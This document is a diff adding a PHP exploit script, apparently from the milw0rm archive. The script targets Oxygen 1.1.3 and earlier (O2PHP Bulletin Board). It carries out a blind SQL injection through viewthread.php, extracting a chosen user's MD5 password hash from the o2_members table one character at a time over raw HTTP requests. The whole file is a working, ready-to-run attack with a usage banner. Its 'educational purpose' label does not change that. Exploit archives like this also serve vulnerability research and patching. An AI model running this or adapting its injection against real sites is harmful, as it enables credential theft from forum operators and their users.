@@ -1,0 +1,57 @@
+#!/usr/bin/php
+<?
+
+if($argc<4){
+ print("
+ -------------------------------------------------------
+ Affected.scr..: Oxygen <= 1.1.3 (O2PHP Bulletin Board)
+ Poc.ID........: 14061118
+ Type..........: SQL Injection
+ Risk.level....: Medium
+ Conditions....: register_globals = on
+ Src.download..: download.o2php.com
+ Poc.link......: acid-root.new.fr/poc/14061118.txt
+ Credits.......: DarkFig
+ Note..........: FOR EDUCATIONAL PURPOSE ONLY
+ -------------------------------------------------------
+ Usage.........: php 14061118.txt <host> <path> <userid>
+ -------------------------------------------------------\n");
+ exit(1);
+}
+
+print "\n Please be patient (max=736 hits)...\n MD5: ";
+$host = !preg_match("/^http:\/\/(\S*)/",$argv[1],$hwttp) ? $argv[1] : $hwttp[1];
+$path = $argv[2];
+$usid = intval($argv[3]);
+$tabl = "o2_members";
+
+for($x=1;  $x<=32; $x++) {
+for($y=48; $y<=71; $y++) {
+
+$recv  = '';
+$sqli  = "%20UNION%20SELECT%201,1%20FROM%20".$tabl."%20WHERE%20uid=".$usid."%20AND%20substr(password,".$x.",1)=char(".$y.")%23";
+$data  = "GET ".$path."viewthread.php?tid=1&pid=-1".$sqli." HTTP/1.1 \r\n";
+$data .= "Host: $host\r\n";
+$data .= "Connection: Close\r\n\r\n";
+
+if(!$sock  = @fsockopen($host, 80)) die("Connection problem\n");
+fputs($sock, $data);
+
+while(!feof($sock)) $recv .= fgets($sock);
+fclose($sock);
+
+if(preg_match("/Location: viewthread.php/", $recv)) {
+  print strtolower(chr($y));
+  break;
+} elseif($y == 71) {
+  print "Not vulnerable\n";
+  exit(1);
+
+}}}
+
+print "\n";
+exit(0);
+
+?>
+
+# milw0rm.com [2006-11-18]
